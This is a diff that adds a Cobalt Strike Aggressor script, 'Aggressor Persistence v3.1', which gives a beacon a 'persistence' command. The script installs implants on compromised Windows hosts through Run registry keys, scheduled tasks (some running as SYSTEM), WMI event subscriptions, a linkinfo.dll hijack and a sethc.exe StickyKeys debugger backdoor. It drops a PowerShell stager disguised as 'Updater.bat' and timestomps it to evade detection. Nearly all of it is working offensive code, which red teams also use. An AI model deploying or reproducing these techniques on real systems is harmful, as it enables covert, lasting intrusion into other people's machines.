@@ -1,0 +1,584 @@
+##################################
+### Aggressor Persistence v3.1 ###
+###     By: Tyler Rosonke      ###
+###        zonksec.com         ###
+##################################
+
+alias persistence {
+
+########### Add Menu #############
+        if ($2 eq "Add"){
+            if ($3 eq "RegKeyRun") {
+                addRegKeyRun($1,$2,$3,$4,$5,$6);
+            }
+            else if ($3 eq "SchTasks"){
+                if ($4 eq "OnIdle") {
+                    addSchTasksOnIdle($1,$2,$3,$4,$5,$6);
+                }
+                else if ($4 eq "OnStart") {
+                    addSchTasksOnStart($1,$2,$3,$4,$5,$6);
+                }
+                else if ($4 eq "OnLogon") {
+                    addSchTasksOnLogon($1,$2,$3,$4,$5,$6);
+                }
+                else if ($4 eq "OnTime") {
+                    addSchTasksOnTime($1,$2,$3,$4,$5,$6);
+                }
+                else {
+                    berror($1, "Specify OnIdle, OnStart, OnLogon, or OnTime.");
+                }
+            }
+            else if ($3 eq "WMI"){
+                if ($4 eq "OnStart"){
+                    addWMIOnStart($1,$2,$3,$4,$5,$6);
+                }
+                else if ($4 eq "Daily"){
+                    addWMIDaily($1,$2,$3,$4,$5,$6);
+                }
+                else {
+                    berror($1, "Specifiy OnStart or Daily.");
+                }
+            }
+            else if ($3 eq "linkinfo") {
+                addLinkinfo($1);
+            }
+            else if ($3 eq "StickyKeys") {
+                addStickyKeys($1);
+            }
+            else {
+                berror($1, "Specify RegKeyRun, SchTasks, WMI, linkinfo, or StickyKeys.");
+            }
+        }
+
+########### Remove Menu #############
+        else if ($2 eq "Remove"){
+            if ($3 eq "RegKeyRun") {
+                remRegKeyRun($1,$2,$3,$4,$5,$6);
+            }
+            else if ($3 eq "SchTasks"){
+                if ($4 eq "OnIdle") {
+                    remSchTasksOnIdle($1,$2,$3,$4,$5,$6);
+                }
+                else if ($4 eq "OnStart") {
+                    remSchTasksOnStart($1,$2,$3,$4,$5,$6);
+                }
+                else if ($4 eq "OnLogon") {
+                    remSchTasksOnLogon($1,$2,$3,$4,$5,$6);
+                }
+                else if ($4 eq "OnTime") {
+                    remSchTasksOnTime($1,$2,$3,$4,$5,$6);
+                }
+                else {
+                    berror($1, "Specify OnIdle, OnStart, OnLogon, or OnTime.");
+                }
+            }
+            else if ($3 eq "WMI"){
+                if ($4 eq "OnStart"){
+                    remWMIOnStart($1,$2,$3,$4,$5,$6);
+                }
+                else if ($4 eq "Daily"){
+                    remWMIDaily($1,$2,$3,$4,$5,$6);
+                }
+                else {
+                    berror($1, "Specifiy OnStart or Daily.");
+                }
+            }
+            else if ($3 eq "linkinfo") {
+                remLinkinfo($1);
+            }
+             else if ($3 eq "StickyKeys") {
+                remStickyKeys($1);
+            }
+            else {
+                berror($1, "Specify RegKeyRun, SchTasks, WMI, linkinfo, or StickyKeys.");
+            }
+        }
+        else {
+            berror($1, "Specify Add or Remove.");
+        }
+}
+
+########### Subroutines #############
+
+# 64bit check not used elsewhere in the script yet
+sub checkX64 {
+    if (-is64 $1) {
+        binput($1, "You're on a 64bit host! Make sure you're running in a 64bit process or file and registry changes may end up in SYSWOW locations and fail to function as intended!");
+        return true;
+    }
+    else {
+        return false;
+    }
+}
+
+sub uploadPSpayload {
+    # Improved robustness in cases where you have more than one listener configured (foreign listeners)
+    # Additionally, this method leverages an encoded command rather than staging via the Powershell download IEX cradle
+    
+    $availableListeners = listeners();
+
+    # Skip listener selection if only one exists
+    if (size($availableListeners()) eq 1) {
+        $listener = $availableListeners[0];
+        binput($1, "Persisting listener: $listener");
+        $data = "@echo off\r\n";
+        $data = $data . powershell($listener, false);
+        binput($1, "Attempting to upload persistence file: $2");
+        bupload_raw($1, $2, $data);
+        binput($1, "timestomp $2 explorer.exe");
+        btimestomp($1, $2,'C:\Windows\explorer.exe');
+    }
+
+    # There is likely a better way to select a listener, but this is the quickest method I came up with without modifying the logic of every function to require a listener_name
+    # Use payload helper function if more than one listener is available
+    else {
+        # Store the payloadPath as global variable so it can be accessed by the callback function of &openPayloadHelper
+        # If you include instructions contingent on the completion of the openPayloadHelper function outside of its callback function,
+        #  those instructions will execute as soon as the payload selection dialog opens and they will fail. This is why some code repeats
+        
+        global ('$gpayloadPath');
+        $gpayloadPath = $2;
+        openPayloadHelper(lambda({
+            $listener = $1;
+            binput($bids, "Persisting listener: $listener");
+            $data = "@echo off\r\n";
+            $data = $data . powershell($listener, false);
+            binput($bids, "Attempting to upload persistence file: $gpayloadPath");
+            
+            bupload_raw($bids, $gpayloadPath, $data);
+            binput($bids, "timestomp $gpayloadPath explorer.exe");
+            btimestomp($bids, $gpayloadPath,'C:\Windows\explorer.exe');
+        }, $bids => $1));
+    }
+ 
+}
+sub isAdmin {
+    return iff( right(beacon_info($1, "user"), 2) eq " *" , true, false);
+}
+sub addRegKey
+{
+    $powershell = "New-ItemProperty -Path \"" . $hive . ":" . $keyPath . "\" -Name " . $keyName . " -PropertyType String -Value " . $payloadPath;
+    bpowershell($1, $powershell);
+}
+sub remRegKey
+{
+    $powershell = "Remove-ItemProperty -Path \"" . $hive . ":" . $keyPath . "\" -Name " . $keyName;
+    bpowershell($1, $powershell);
+}
+sub addRegKeyRun {
+    if ($4) {
+        $payloadName = $4;
+        $keyName = $4;
+    }
+    else {
+        $payloadName = "Updater";
+        $keyName = "Updater";
+    }
+    if (isAdmin($1)){
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        $hive = "HKLM";
+    }
+    else {
+        $payloadPath = "C:\\Users\\Public\\" . $payloadName . ".bat";
+        $hive = "HKCU";
+    }
+    $keyPath = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
+    addRegKey($1,$hive,$keyPath,$keyName,$payloadPath);
+    uploadPSpayload($1,$payloadPath);
+}
+sub remRegKeyRun {
+    if ($4) {
+        $payloadName = $4;
+        $keyName = $4;
+    }
+    else {
+        $payloadName = "Updater";
+        $keyName = "Updater";
+    }
+    if (isAdmin($1)){
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        $hive = "HKLM";
+    }
+    else {
+        $payloadPath = "C:\\Users\\Public\\" . $payloadName . ".bat";
+        $hive = "HKCU";
+    }
+    $keyPath = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
+    remRegKey($1,$hive,$keyPath,$keyName);
+    brm($1,$payloadPath);
+    
+}
+sub addSchTasksOnIdle {
+    if ($5) {
+        if ($6) {
+            $payloadName = $6;
+            $taskName = $6;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+        if (isAdmin($1)){
+            $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        }
+        else {
+            $payloadPath = "C:\\Users\\Public\\" . $payloadName . ".bat";
+        }
+        $powershellcmd = "schtasks /create /tn " . $taskName . " /tr " . $payloadPath . " /sc onidle /i " . $5;
+        bpowershell($1,$powershellcmd);
+        uploadPSpayload($1,$payloadPath);
+    }
+    else {
+        berror($1, "Specify number idle time.");
+    }
+}
+sub remSchTasksOnIdle {
+    if ($5) {
+        if ($6) {
+            $payloadName = $6;
+            $taskName = $6;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+        if (isAdmin($1)){
+            $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        }
+        else {
+            $payloadPath = "C:\\Users\\Public\\" . $payloadName . ".bat";
+        }
+        $powershellcmd = "schtasks /delete /f /tn  " . $taskName;
+        bpowershell($1,$powershellcmd);
+        brm($1,$payloadPath);
+    }
+    else {
+        berror($1, "Specify number idle time.");
+    }
+}
+sub addSchTasksOnStart {
+    if (isAdmin($1)){
+        if ($5) {
+            $payloadName = $5;
+            $taskName = $5;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+ 
+        $powershellcmd = "schtasks /create /tn " . $taskName . " /tr " . $payloadPath . ' /sc onstart /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST';
+        bpowershell($1,$powershellcmd);
+        uploadPSpayload($1,$payloadPath);
+    }
+    else {
+        berror($1, "Admin is needed for SchTasks OnStart.");
+    }
+}
+sub remSchTasksOnStart {
+    if (isAdmin($1)){
+        if ($5) {
+            $payloadName = $5;
+            $taskName = $5;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+
+        $powershellcmd = "schtasks /delete /f /tn " . $taskName;
+        bpowershell($1,$powershellcmd);
+        brm($1,$payloadPath);
+    }
+    else {
+        berror($1, "Admin is needed for SchTasks OnStart.");
+    }
+}
+sub addSchTasksOnLogon {
+    if (isAdmin($1)){
+        if ($5) {
+            $payloadName = $5;
+            $taskName = $5;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        
+        $powershellcmd = "schtasks /create /tn " . $taskName . " /tr " . $payloadPath . " /sc ONLOGON";
+        bpowershell($1,$powershellcmd);
+        uploadPSpayload($1,$payloadPath);
+    }
+    else {
+        berror($1, "Admin is needed for SchTasks OnLogon.");
+    }
+}
+sub remSchTasksOnLogon {
+    if (isAdmin($1)){
+        if ($5) {
+            $payloadName = $5;
+            $taskName = $5;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+        
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        
+        $powershellcmd = "schtasks /delete /f /tn " . $taskName;
+        bpowershell($1,$powershellcmd);
+        brm($1,$payloadPath);
+    }
+    else {
+        berror($1, "Admin is needed for SchTasks OnStart.");
+    }
+}
+sub addSchTasksOnTime {
+    if ($5 eq "Hourly" || $5 eq "Daily" || $5 eq "Weekly" || $5 eq "Monthly") {
+        if ($6) {
+            $payloadName = $6;
+            $taskName = $6;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+        if (isAdmin($1)){
+            $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        }
+        else {
+            $payloadPath = "C:\\Users\\Public\\" . $payloadName . ".bat";
+        }
+        $powershellcmd = "schtasks /create /tn " . $taskName . " /tr " . $payloadPath . " /sc " . $5;
+        bpowershell($1,$powershellcmd);
+        uploadPSpayload($1,$payloadPath);
+    }
+    else {
+        berror($1, "Specify Hourly, Daily, Weekly, or Monthly.");
+    }
+}
+sub remSchTasksOnTime {
+    if ($5 eq "Hourly" || $5 eq "Daily" || $5 eq "Weekly" || $5 eq "Monthly") {
+        if ($6) {
+            $payloadName = $6;
+            $taskName = $6;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+        if (isAdmin($1)){
+            $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+        }
+        else {
+            $payloadPath = "C:\\Users\\Public\\" . $payloadName . ".bat";
+        }
+        $powershellcmd = "schtasks /delete /f /tn " . $taskName;
+        bpowershell($1,$powershellcmd);
+        brm($1,$payloadPath);
+    }
+    else {
+        berror($1, "Specify Hourly, Daily, Weekly, or Monthly.");
+    }
+}
+sub addWMIOnStart {
+    if (isAdmin($1)){
+        if ($5) {
+            $payloadName = $5;
+            $taskName = $5;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+ 
+        $powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" . $taskName ."';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name='" . $taskName . "';ExecutablePath='" . $payloadPath ."';CommandLineTemplate ='" . $payloadPath . "'};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
+
+        bpowershell($1,$powershellcmd);
+        uploadPSpayload($1,$payloadPath);
+    }
+    else {
+        berror($1, "Admin is needed for WMI.");
+    }
+}
+sub remWMIOnStart {
+    if (isAdmin($1)){
+        if ($5) {
+            $payloadName = $5;
+            $taskName = $5;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+        
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+
+        $powershellcmd = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='" . $taskName . "'\"| Remove-WmiObject;Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='" . $taskName . "'\" | Remove-WmiObject; Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { \$_.filter -match '" . $taskName . "'} | Remove-WmiObject;";
+        bpowershell($1,$powershellcmd);
+        brm($1,$payloadPath);
+    }
+    else {
+        berror($1, "Admin is needed for WMI.");
+    }
+}
+sub addWMIDaily {
+    if (isAdmin($1)){
+        if ($5) {
+            $payloadName = $5;
+            $taskName = $5;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+        
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+
+        $powershellcmd = "\$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='" . $taskName ."';EventNameSpace='root\\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 13 AND TargetInstance.Minute = 00 GROUP WITHIN 60\"};\$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name='" . $taskName . "';ExecutablePath='" . $payloadPath ."';CommandLineTemplate ='" . $payloadPath . "'};Set-WmiInstance -Namespace \"root\\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter;Consumer=\$Consumer};";
+
+        bpowershell($1,$powershellcmd);
+        uploadPSpayload($1,$payloadPath);
+    }
+    else {
+        berror($1, "Admin is needed for WMI.");
+    }
+}
+sub remWMIDaily {
+    if (isAdmin($1)){
+        if ($5) {
+            $payloadName = $5;
+            $taskName = $5;
+        }
+        else {
+            $payloadName = "Updater";
+            $taskName = "Updater";
+        }
+
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+
+        $powershellcmd = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='" . $taskName . "'\"| Remove-WmiObject;Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='" . $taskName . "'\" | Remove-WmiObject; Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { \$_.filter -match '" . $taskName . "'} | Remove-WmiObject;";
+        bpowershell($1,$powershellcmd);
+        brm($1,$payloadPath);
+    }
+    else {
+        berror($1, "Admin is needed for WMI.");
+    }
+}
+
+sub addLinkinfo {
+    # dll hijack on explorer.exe
+    if (isAdmin($1)) {
+        if (-exists script_resource("/payloads/linkinfo.dll")) {
+            binput($1, "[*] Dropping linkinfo.dll persistence");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("/payloads/linkinfo.dll"));
+            btimestomp($1, "linkinfo.dll", 'c:\windows\system32\linkinfo.dll');
+        }
+        else {
+            berror($1, "./payloads/linkinfo.dll not found. Make sure you've created a DLL that matches the target architecture and stored it as ./payloads/linkinfo.dll");
+        }
+    }
+    else {
+        berror($1, 'Admin or write-access to C:\Windows is needed for linkinfo.dll hijack');
+    }
+}
+
+sub remLinkinfo {
+    # Remove dll hijack on explorer.exe
+    if (isAdmin($1)) {
+        binput($1, "[*] Removing linkinfo.dll persistence");
+        $payloadPath = "C:\windows\linkinfo.dll";
+        brm($1,$payloadPath);
+    }
+    else {
+        berror($1, 'Admin or write-access to C:\Windows is needed for linkinfo.dll hijack removal');
+    }
+}
+
+sub addStickyKeys {
+    if (isAdmin($1)){
+        if ($4) {
+            $payloadName = $4;
+            $keyName = "Debugger";
+        }
+        else {
+            $payloadName = "Updater";
+            $keyName = "Debugger";
+        }
+        
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+
+        $hive = "HKLM";
+        $keyPath = '\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe';
+        
+        $powershellcmd  = 'New-Item -Path "' . $hive . $keyPath . '" -Name sethc.exe -Force';
+        bpowershell($1,$powershellcmd);
+        
+        addRegKey($1,$hive,$keyPath,$keyName,$payloadPath);
+        uploadPSpayload($1,$payloadPath);
+    }
+    else {
+        berror($1, "Admin is needed for StickyKeys.");
+    }
+}
+
+sub remStickyKeys {
+    if (isAdmin($1)){
+        if ($4) {
+            $payloadName = $4;
+            $keyName = "Debugger";
+        }
+        else {
+            $payloadName = "Updater";
+            $keyName = "Debugger";
+        }
+        
+        $payloadPath = "C:\\Windows\\System32\\" . $payloadName . ".bat";
+
+        $hive = "HKLM";
+        $keyPath = '\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe';     
+        remRegKey($1,$hive,$keyPath,$keyName);
+
+        brm($1,$payloadPath);
+
+    }
+    else {
+        berror($1, "Admin is needed for StickyKeys.");
+    }
+}
+
+
+##### Help Menu ######
+beacon_command_register(
+    "persistence", 
+    "add or remove persistence capabilities to a beacon", 
+    "add or remove persistence capabilities to a beacon
+
+Usage: persistence [Add | Remove] [method] [arguments]
+
+Available methods:
+    RegKeyRun <payload / key name>
+    SchTasks OnIdle [idle time] <payload / task name>
+    SchTasks OnTime [Hourly | Daily | Weekly | Monthly] <payload / task name>
+    *SchTasks OnStart <payload / task name>
+    *SchTasks OnLogon <payload / task name>
+    *WMI OnStart <payload / task name>
+    *WMI Daily <payload / task name>
+    **linkinfo
+    *StickyKeys <payload / key name>
+
+ * = method needs admin
+** = method need admin to install, but executes as USER
+[] = requireed argument
+<> = optional argument
+");
